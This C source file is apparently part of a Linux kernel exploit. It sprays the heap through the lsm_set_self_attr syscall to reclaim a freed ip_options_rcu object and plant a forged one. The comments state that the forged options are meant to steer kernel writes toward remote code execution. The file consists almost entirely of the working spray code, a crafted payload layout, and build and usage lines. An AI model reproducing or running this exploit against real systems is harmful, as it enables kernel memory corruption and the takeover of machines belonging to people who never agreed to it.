/* ssa_spray.c - reclaim the freed ip_options_rcu via lsm_set_self_attr
 * (security_setselfattr).
 *
 *   lsm_set_self_attr(attr, uctx, size, flags):
 *       lctx = memdup_user(uctx, size);      // BEFORE any validation
 *       ... struct/LSM checks fail on garbage ...
 *       kfree(lctx);                          // freed -> fast churn
 *
 * Unprivileged (own attributes), arbitrary bytes, arbitrary size (>= 32),
 * a direct syscall - the fastest churn primitive of the set. The call site
 * (security_setselfattr+0x43) must share the boot's RANDOM_KMALLOC_CACHES
 * bucket with tcp_v4_save_options; the spray picker selects it.
 *
 * Payload: fake ip_options_rcu (buffer IS the object), the RCE aiming:
 *   optlen=40 srr=67 rr=68 ts=69 flags=0x28, faddr=32.32.32.32,
 *   __data = printable TS option. With the client ISN 0x6D507163 the three
 *   ip_options_build writes land at shinfo+8 (frag_list low = X) and
 *   shinfo+12 (frag_list high = Y).
 *
 * Build: gcc -O2 -static -o ssa_spray ssa_spray.c
 * Usage: ./ssa_spray <runtime_s> [cpu]
 */
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/syscall.h>

#ifndef __NR_lsm_set_self_attr
#define __NR_lsm_set_self_attr 460
#endif

#define CNT 88   /* alloc = 88 bytes -> kmalloc-96 */

int main(int argc, char **argv) {
    int runtime = argc > 1 ? atoi(argv[1]) : 30;
    int cpu = argc > 2 ? atoi(argv[2]) : 0;
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);

    unsigned char buf[CNT];
    int safe = getenv("ACCEPTOR_SAFE") != NULL;
    memset(buf, 0x41, sizeof(buf));
    buf[16] = 32; buf[17] = 32; buf[18] = 32; buf[19] = 32;  /* faddr (unused) */
    buf[24] = 40;    /* optlen */
    buf[25] = safe ? 0 : 67;    /* srr  */
    buf[26] = safe ? 0 : 68;    /* rr   */
    buf[27] = safe ? 0 : 69;    /* ts   */
    buf[28] = safe ? 0x00 : 0x28;  /* flags: rr_needaddr | ts_needaddr */
    buf[32] = 0x44;  /* __data: valid printable TS option */
    buf[33] = 0x28;
    buf[34] = 0x25;
    buf[35] = 0x20;
    /* markers: s1 = object[39..42], s3 = object[47..50] */
    buf[39] = 0x41; buf[40] = 0x42; buf[41] = 0x43; buf[42] = 0x44;
    buf[47] = 0x45; buf[48] = 0x46; buf[49] = 0x47; buf[50] = 0x48;

    unsigned long n = 0, err = 0;
    time_t t0 = time(NULL);
    while ((int)(time(NULL) - t0) < runtime) {
        for (int i = 0; i < 256; i++) {
            long r = syscall(__NR_lsm_set_self_attr, 1, buf, CNT, 0);
            if (r < 0) err++; else n++;
        }
    }
    fprintf(stderr, "[ssa] writes=%lu err=%lu\n", n, err);
    return 0;
}
